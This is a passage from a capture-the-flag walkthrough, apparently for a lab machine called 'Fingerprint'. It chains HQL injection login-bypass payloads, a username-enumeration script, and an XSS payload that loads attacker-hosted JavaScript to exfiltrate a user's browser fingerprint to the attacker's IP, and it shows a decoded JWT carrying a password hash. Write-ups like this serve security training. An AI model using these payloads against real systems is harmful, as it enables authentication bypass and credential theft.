class="string">&#x27;&#x27;</span><span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">AND</span> auth_primary <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">AND</span> auth_secondary <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure><p>We get a new error that seems to mean the <code>uid</code> field doesn’t exist.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.persistence.PersistenceException: org.hibernate.exception.SQLGrammarException: could <span class="keyword">not</span> extract ResultSet</span><br></pre></td></tr></table></figure><p>Let’s try with <code>username</code> instead:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid<span class="operator">=</span>x<span class="string">&#x27; OR SUBSTRING(username,1,1)=&#x27;</span>a<span class="string">&#x27; and &#x27;&#x27;=&#x27;</span><span class="operator">&amp;</span>auth_primary<span class="operator">=</span>x<span class="operator">&amp;</span>auth_secondary<span class="operator">=</span><span class="number">15</span>ada043824662a14c90f70a82f31a2525</span><br></pre></td></tr></table></figure><p>Bingo! It works and we get a new error this time about <code>auth_secondary</code> meaning we probably successfully bypassed the username/password part of the authentication:</p><p><img src="https://user-images.githubusercontent.com/9076747/163710365-7515ee7f-f3fd-4dd8-afc3-4d8d4496196d.png" alt="https://user-images.githubusercontent.com/9076747/163710365-7515ee7f-f3fd-4dd8-afc3-4d8d4496196d.png"></p><p><em>Note: We could have guessed the username was <code>admin</code> and the following payload would have worked as well:</em></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid<span class="operator">=</span>x<span class="string">&#x27; OR username=&#x27;</span>admin<span class="string">&#x27; and &#x27;&#x27;=&#x27;</span><span class="operator">&amp;</span>auth_primary<span class="operator">=</span>x<span class="operator">&amp;</span>auth_secondary<span class="operator">=</span><span class="number">15</span>ada043824662a14c90f70a82f31a25</span><br></pre></td></tr></table></figure><p><em>The <code>substring</code> method could have been used to enumerate the username of the second user with a simple script. So far it doesn’t seem necessary.</em></p><p>Let’s now focus on the unusual <code>auth_secondary</code> parameter sent when trying to log in:</p><p><img src="https://user-images.githubusercontent.com/9076747/163689606-e3c205dd-be3d-479e-92b8-658f5b71d095.png" alt="https://user-images.githubusercontent.com/9076747/163689606-e3c205dd-be3d-479e-92b8-658f5b71d095.png"></p><p>The parameter is the same on every request and looks like an MD5 format. </p><p>Checking the page source code we can see the JavaScript file generating the <code>auth_secondary</code> string at <a href="http://fingerprint.htb:8080/resources/js/login.js"><code>http://fingerprint.htb:8080/resources/js/login.js</code></a> </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFingerPrintID</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> fingerprint = navigator.appCodeName + navigator.appVersion + (navigator.cookieEnabled ? <span class="string">&quot;yes&quot;</span> : <span class="string">&quot;no&quot;</span>) + navigator.language + navigator.platform + navigator.productSub + navigator.userAgent + navigator.vendor + screen.availWidth + <span class="string">&quot;&quot;</span> + screen.availHeight + <span class="string">&quot;&quot;</span> + screen.width + <span class="string">&quot;&quot;</span> + screen.height + <span class="string">&quot;&quot;</span> + screen.orientation.type + <span class="string">&quot;&quot;</span> + screen.pixelDepth + <span class="string">&quot;&quot;</span> + screen.colorDepth + <span class="built_in">Intl</span>.DateTimeFormat().resolvedOptions().timeZone;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> plugin <span class="keyword">of</span> navigator.plugins) &#123;</span><br><span class="line">        fingerprint += plugin.name + <span class="string">&quot;,&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> mime <span class="keyword">of</span> navigator.mimeTypes) &#123;</span><br><span class="line">        fingerprint += mime.type + <span class="string">&quot;,&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> MD5(fingerprint)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So this is where the name of the box comes from. This function is gathering a lot of information from the client and creating an MD5 fingerprint from concatenating all this data. </p><p>We can guess that only the fingerprint of the two users in the database are allowed to connect.</p><p>The MD5 hash function comes from a <a href="https://stackoverflow.com/a/69122129">common JavaScript implementation</a>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> md5 = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> MD5 = <span class="function"><span class="keyword">function</span> (<span class="params">d</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> M(V(Y(X(d), <span class="number">8</span> * d.length)))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">M</span> (<span class="params">d</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> _, m = <span class="string">&#x27;0123456789abcdef&#x27;</span>, f = <span class="string">&#x27;&#x27;</span>, r = <span class="number">0</span>; r &lt; d.length; r++) &#123;</span><br><span class="line">            _ = d.charCodeAt(r)</span><br><span class="line">            f += m.charAt(_ &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>) + m.charAt(<span class="number">15</span> &amp; _)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">X</span> (<span class="params">d</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> _ = <span class="built_in">Array</span>(d.length &gt;&gt; <span class="number">2</span>), m = <span class="number">0</span>; m &lt; _.length; m++) &#123;</span><br><span class="line">            _[m] = <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (m = <span class="number">0</span>; m &lt; <span class="number">8</span> * d.length; m += <span class="number">8</span>) &#123;</span><br><span class="line">            _[m &gt;&gt; <span class="number">5</span>] |= (<span class="number">255</span> &amp; d.charCodeAt(m / <span class="number">8</span>)) &lt;&lt; m % <span class="number">32</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">V</span> (<span class="params">d</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> _ = <span class="string">&#x27;&#x27;</span>, m = <span class="number">0</span>; m &lt; <span class="number">32</span> * d.length; m += <span class="number">8</span>) _ += <span class="built_in">String</span>.fromCharCode(d[m &gt;&gt; <span class="number">5</span>] &gt;&gt;&gt; m % <span class="number">32</span> &amp; <span class="number">255</span>)</span><br><span class="line">        <span class="keyword">return</span> _</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Y</span> (<span class="params">d, _</span>) </span>&#123;</span><br><span class="line">        d[_ &gt;&gt; <span class="number">5</span>] |= <span class="number">128</span> &lt;&lt; _ % <span class="number">32</span></span><br><span class="line">        d[<span class="number">14</span> + (_ + <span class="number">64</span> &gt;&gt;&gt; <span class="number">9</span> &lt;&lt; <span class="number">4</span>)] = _</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> m = <span class="number">1732584193</span>, f = -<span class="number">271733879</span>, r = -<span class="number">1732584194</span>, i = <span class="number">271733878</span>, n = <span class="number">0</span>; n &lt; d.length; n += <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> h = m</span><br><span class="line">            <span class="keyword">var</span> t = f</span><br><span class="line">            <span class="keyword">var</span> g = r</span><br><span class="line">            <span class="keyword">var</span> e = i</span><br><span class="line">            f = md5ii(f = md5ii(f = md5ii(f = md5ii(f = md5hh(f = md5hh(f = md5hh(f = md5hh(f = md5gg(f = md5gg(f = md5gg(f = md5gg(f = md5ff(f = md5ff(f = md5ff(f = md5ff(f, r = md5ff(r, i = md5ff(i, m = md5ff(m, f, r, i, d[n + <span class="number">0</span>], <span class="number">7</span>, -<span class="number">680876936</span>), f, r, d[n + <span class="number">1</span>], <span class="number">12</span>, -<span class="number">389564586</span>), m, f, d[n + <span class="number">2</span>], <span class="number">17</span>, <span class="number">606105819</span>), i, m, d[n + <span class="number">3</span>], <span class="number">22</span>, -<span class="number">1044525330</span>), r = md5ff(r, i = md5ff(i, m = md5ff(m, f, r, i, d[n + <span class="number">4</span>], <span class="number">7</span>, -<span class="number">176418897</span>), f, r, d[n + <span class="number">5</span>], <span class="number">12</span>, <span class="number">1200080426</span>), m, f, d[n + <span class="number">6</span>], <span class="number">17</span>, -<span class="number">1473231341</span>), i, m, d[n + <span class="number">7</span>], <span class="number">22</span>, -<span class="number">45705983</span>), r = md5ff(r, i = md5ff(i, m = md5ff(m, f, r, i, d[n + <span class="number">8</span>], <span class="number">7</span>, <span class="number">1770035416</span>), f, r, d[n + <span class="number">9</span>], <span class="number">12</span>, -<span class="number">1958414417</span>), m, f, d[n + <span class="number">10</span>], <span class="number">17</span>, -<span class="number">42063</span>), i, m, d[n + <span class="number">11</span>], <span class="number">22</span>, -<span class="number">1990404162</span>), r = md5ff(r, i = md5ff(i, m = md5ff(m, f, r, i, d[n + <span class="number">12</span>], <span class="number">7</span>, <span class="number">1804603682</span>), f, r, d[n + <span class="number">13</span>], <span class="number">12</span>, -<span class="number">40341101</span>), m, f, d[n + <span class="number">14</span>], <span class="number">17</span>, -<span class="number">1502002290</span>), i, m, d[n + <span class="number">15</span>], <span class="number">22</span>, <span class="number">1236535329</span>), r = md5gg(r, i = md5gg(i, m = md5gg(m, f, r, i, d[n + <span class="number">1</span>], <span class="number">5</span>, -<span class="number">165796510</span>), f, r, d[n + <span class="number">6</span>], <span class="number">9</span>, -<span class="number">1069501632</span>), m, f, d[n + <span class="number">11</span>], <span class="number">14</span>, <span class="number">643717713</span>), i, m, d[n + <span class="number">0</span>], <span class="number">20</span>, -<span class="number">373897302</span>), r = md5gg(r, i = md5gg(i, m = md5gg(m, f, r, i, d[n + <span class="number">5</span>], <span class="number">5</span>, -<span class="number">701558691</span>), f, r, d[n + <span class="number">10</span>], <span class="number">9</span>, <span class="number">38016083</span>), m, f, d[n + <span class="number">15</span>], <span class="number">14</span>, -<span class="number">660478335</span>), i, m, d[n + <span class="number">4</span>], <span class="number">20</span>, -<span class="number">405537848</span>), r = md5gg(r, i = md5gg(i, m = md5gg(m, f, r, i, d[n + <span class="number">9</span>], <span class="number">5</span>, <span class="number">568446438</span>), f, r, d[n + <span class="number">14</span>], <span class="number">9</span>, -<span class="number">1019803690</span>), m, f, d[n + <span class="number">3</span>], <span class="number">14</span>, -<span class="number">187363961</span>), i, m, d[n + <span class="number">8</span>], <span class="number">20</span>, <span class="number">1163531501</span>), r = md5gg(r, i = md5gg(i, m = md5gg(m, f, r, i, d[n + <span class="number">13</span>], <span class="number">5</span>, -<span class="number">1444681467</span>), f, r, d[n + <span class="number">2</span>], <span class="number">9</span>, -<span class="number">51403784</span>), m, f, d[n + <span class="number">7</span>], <span class="number">14</span>, <span class="number">1735328473</span>), i, m, d[n + <span class="number">12</span>], <span class="number">20</span>, -<span class="number">1926607734</span>), r = md5hh(r, i = md5hh(i, m = md5hh(m, f, r, i, d[n + <span class="number">5</span>], <span class="number">4</span>, -<span class="number">378558</span>), f, r, d[n + <span class="number">8</span>], <span class="number">11</span>, -<span class="number">2022574463</span>), m, f, d[n + <span class="number">11</span>], <span class="number">16</span>, <span class="number">1839030562</span>), i, m, d[n + <span class="number">14</span>], <span class="number">23</span>, -<span class="number">35309556</span>), r = md5hh(r, i = md5hh(i, m = md5hh(m, f, r, i, d[n + <span class="number">1</span>], <span class="number">4</span>, -<span class="number">1530992060</span>), f, r, d[n + <span class="number">4</span>], <span class="number">11</span>, <span class="number">1272893353</span>), m, f, d[n + <span class="number">7</span>], <span class="number">16</span>, -<span class="number">155497632</span>), i, m, d[n + <span class="number">10</span>], <span class="number">23</span>, -<span class="number">1094730640</span>), r = md5hh(r, i = md5hh(i, m = md5hh(m, f, r, i, d[n + <span class="number">13</span>], <span class="number">4</span>, <span class="number">681279174</span>), f, r, d[n + <span class="number">0</span>], <span class="number">11</span>, -<span class="number">358537222</span>), m, f, d[n + <span class="number">3</span>], <span class="number">16</span>, -<span class="number">722521979</span>), i, m, d[n + <span class="number">6</span>], <span class="number">23</span>, <span class="number">76029189</span>), r = md5hh(r, i = md5hh(i, m = md5hh(m, f, r, i, d[n + <span class="number">9</span>], <span class="number">4</span>, -<span class="number">640364487</span>), f, r, d[n + <span class="number">12</span>], <span class="number">11</span>, -<span class="number">421815835</span>), m, f, d[n + <span class="number">15</span>], <span class="number">16</span>, <span class="number">530742520</span>), i, m, d[n + <span class="number">2</span>], <span class="number">23</span>, -<span class="number">995338651</span>), r = md5ii(r, i = md5ii(i, m = md5ii(m, f, r, i, d[n + <span class="number">0</span>], <span class="number">6</span>, -<span class="number">198630844</span>), f, r, d[n + <span class="number">7</span>], <span class="number">10</span>, <span class="number">1126891415</span>), m, f, d[n + <span class="number">14</span>], <span class="number">15</span>, -<span class="number">1416354905</span>), i, m, d[n + <span class="number">5</span>], <span class="number">21</span>, -<span class="number">57434055</span>), r = md5ii(r, i = md5ii(i, m = md5ii(m, f, r, i, d[n + <span class="number">12</span>], <span class="number">6</span>, <span class="number">1700485571</span>), f, r, d[n + <span class="number">3</span>], <span class="number">10</span>, -<span class="number">1894986606</span>), m, f, d[n + <span class="number">10</span>], <span class="number">15</span>, -<span class="number">1051523</span>), i, m, d[n + <span class="number">1</span>], <span class="number">21</span>, -<span class="number">2054922799</span>), r = md5ii(r, i = md5ii(i, m = md5ii(m, f, r, i, d[n + <span class="number">8</span>], <span class="number">6</span>, <span class="number">1873313359</span>), f, r, d[n + <span class="number">15</span>], <span class="number">10</span>, -<span class="number">30611744</span>), m, f, d[n + <span class="number">6</span>], <span class="number">15</span>, -<span class="number">1560198380</span>), i, m, d[n + <span class="number">13</span>], <span class="number">21</span>, <span class="number">1309151649</span>), r = md5ii(r, i = md5ii(i, m = md5ii(m, f, r, i, d[n + <span class="number">4</span>], <span class="number">6</span>, -<span class="number">145523070</span>), f, r, d[n + <span class="number">11</span>], <span class="number">10</span>, -<span class="number">1120210379</span>), m, f, d[n + <span class="number">2</span>], <span class="number">15</span>, <span class="number">718787259</span>), i, m, d[n + <span class="number">9</span>], <span class="number">21</span>, -<span class="number">343485551</span>)</span><br><span class="line">            m = safeadd(m, h)</span><br><span class="line">            f = safeadd(f, t)</span><br><span class="line">            r = safeadd(r, g)</span><br><span class="line">            i = safeadd(i, e)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [m, f, r, i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">md5cmn</span> (<span class="params">d, _, m, f, r, i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> safeadd(bitrol(safeadd(safeadd(_, d), safeadd(f, i)), r), m)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">md5ff</span> (<span class="params">d, _, m, f, r, i, n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> md5cmn(_ &amp; m | ~_ &amp; f, d, _, r, i, n)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">md5gg</span> (<span class="params">d, _, m, f, r, i, n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> md5cmn(_ &amp; f | m &amp; ~f, d, _, r, i, n)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">md5hh</span> (<span class="params">d, _, m, f, r, i, n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> md5cmn(_ ^ m ^ f, d, _, r, i, n)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">md5ii</span> (<span class="params">d, _, m, f, r, i, n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> md5cmn(m ^ (_ | ~f), d, _, r, i, n)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">safeadd</span> (<span class="params">d, _</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> m = (<span class="number">65535</span> &amp; d) + (<span class="number">65535</span> &amp; _)</span><br><span class="line">        <span class="keyword">return</span> (d &gt;&gt; <span class="number">16</span>) + (_ &gt;&gt; <span class="number">16</span>) + (m &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">16</span> | <span class="number">65535</span> &amp; m</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bitrol</span> (<span class="params">d, _</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> d &lt;&lt; _ | d &gt;&gt;&gt; <span class="number">32</span> - _</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MD5Unicode</span>(<span class="params">buffer</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!(buffer <span class="keyword">instanceof</span> <span class="built_in">Uint8Array</span>)) &#123;</span><br><span class="line">            buffer = <span class="keyword">new</span> TextEncoder().encode(<span class="keyword">typeof</span> buffer===<span class="string">&#x27;string&#x27;</span> ? buffer : <span class="built_in">JSON</span>.stringify(buffer));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> binary = [];</span><br><span class="line">        <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, il = bytes.byteLength; i &lt; il; i++) &#123;</span><br><span class="line">            binary.push(<span class="built_in">String</span>.fromCharCode(bytes[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> MD5(binary.join(<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> MD5Unicode;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>Given the fingerprint source code is available to us and in a JavaScript format it’s perfect for the XSS vulnerability we found earlier. By hosting the script on our attacker machine we can get the admin to trigger the XSS and exfiltrate his fingerprint for us to reuse.</p><p>First let’s modify the script a little so it will give us the fingerprint:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget [http://fingerprint.htb:8080/resources/js/login.js](http://fingerprint.htb:8080/resources/js/login.js)</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&#x27;location.href=&quot;http://10.10.14.80:8000/&quot;+getFingerPrintID();&#x27;</span> &gt;&gt; login.js</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br></pre></td></tr></table></figure><p>Then send our XSS payload to show up in the main application auth log.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://10.10.14.80:8000/login.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>And Bingo! We get the fingerprint of the <code>admin</code> account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.129.118.212 - - [17/Apr/2022 10:44:09] <span class="string">&quot;GET /login.js HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.129.118.212 - - [17/Apr/2022 10:44:09] code 404, message File not found</span><br><span class="line">10.129.118.212 - - [17/Apr/2022 10:44:09] <span class="string">&quot;GET /962f4a03aa7ebc0515734cf398b0ccd6 HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure><p>Let’s now try to log in using this fingerprint ID and the information we retrieved earlier:</p><p><img src="https://user-images.githubusercontent.com/9076747/163711238-ccb7eb49-75ed-4bc9-8c9c-11b45833335f.png" alt="https://user-images.githubusercontent.com/9076747/163711238-ccb7eb49-75ed-4bc9-8c9c-11b45833335f.png"></p><p>But unfortunately, we get hit with an <code>Invalid fingerprint-ID</code> error again.<br>This means the fingerprint we retrieved is not from <code>admin</code> but from the other user we found in the database.</p><p>Let’s go back a little and create a quick and dirty enumeration script to retrieve this second user username:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">    r = requests.post(<span class="string">&quot;http://fingerprint.htb:8080/login&quot;</span>, data=<span class="string">f&quot;uid=x&#x27; OR SUBSTRING(username,1,1)=&#x27;<span class="subst">&#123;c&#125;</span>&#x27; and &#x27;&#x27;=&#x27;&amp;auth_primary=x&amp;auth_secondary=962f4a03aa7ebc0515734cf398b0ccd6&quot;</span>, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Sign In&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Found username first char: <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>After too many failed attempts we get blocked by the server so we can’t retrieve the full username. But it’s ok, the first character is enough for the injection:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python get_username.py</span><br><span class="line">[!] Found username first char: m</span><br></pre></td></tr></table></figure><h3 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h3><p>Chaining the HQL Injection and the XSS vulnerability we can create our final payload which allow us to bypass the authentication form:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid<span class="operator">=</span>x<span class="string">&#x27; OR SUBSTRING(username,1,1)=&#x27;</span>m<span class="string">&#x27; and &#x27;&#x27;=&#x27;</span><span class="operator">&amp;</span>auth_primary<span class="operator">=</span>x<span class="operator">&amp;</span>auth_secondary<span class="operator">=</span><span class="number">962</span>f4a03aa7ebc0515734cf398b0ccd6</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/163713586-c0015a06-3f13-41cb-a726-57670cd7b86d.png" alt="https://user-images.githubusercontent.com/9076747/163713586-c0015a06-3f13-41cb-a726-57670cd7b86d.png"></p><p>We access an image uploading website. Playing around with it we can see that all files uploaded end up in an images folder but there doesn’t seem to be any way to exploit it. </p><p>Once again, when being stuck let’s go back for more recon to see if any useful information can be found. </p><h3 id="Backups"><a href="#Backups" class="headerlink" title="Backups"></a>Backups</h3><p>While taking a closer look at the HTTP request we can notice the cookie being set when login contains <a href="https://www.baeldung.com/java-serialization">serialized</a> information, including the username we couldn’t fully ex-filtrate earlier, it’s <code>micheal1235</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ JWT=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoick8wQUJYTnlBQ0ZqYjIwdVlXUnRhVzR1YzJWamRYSnBkSGt1YzNKakxtMXZaR1ZzTGxWelpYS1VCTmR6NDErNWF3SUFCRWtBQW1sa1RBQUxabWx1WjJWeWNISnBiblIwQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TUFBaHdZWE56ZDI5eVpIRUFmZ0FCVEFBSWRYTmxjbTVoYldWeEFINEFBWGh3QUFBQUFuUUFRRGRsWmpVeVl6STFNV1k0TURRMFkySXhPRGN3TVRNNU9USTRPVEZrTUdVMU9HTmxPVEU1TkdSbE4yWTFNelZpTVdJMFptRTJZbUptWlRBNE5qYzRaalowQUJSTVYyYzNaMVZTTVVWdFdEZFZUbmh6U25oeFduUUFDMjFwWTJobFlXd3hNak0xIn0.6dfequ2JzMYm2A6wgo6SU_pJWzWgqmGaChbRiXiEgTw</span><br><span class="line">[hg8@archbook ~]$ jq -R <span class="string">&#x27;split(&quot;.&quot;) | .[1] | @base64d | fromjson&#x27;</span> &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$JWT</span>&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQAC21pY2hlYWwxMjM1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQAC21pY2hlYWwxMjM1&quot;</span> | base64 -d</span><br><span class="line">�sr!com.admin.security.src.model.User��kIidL fingerprinttLjava/lang/String;passwordq~usernameq~xpt@7ef52c251f8044cb187013992891d0e58ce9194de7f535b1b4fa6bbfe08678f6tLWg7gUR1EmX7UNxsJxqZt micheal1235%</span><br></pre></td></tr></table></figure><p>While continuing the recon with <code>gobuster</code> we find two Java files in the <code>/backups/</code>folder: <code>[User.java](http://User.java)</code> and <code>Profile.java</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 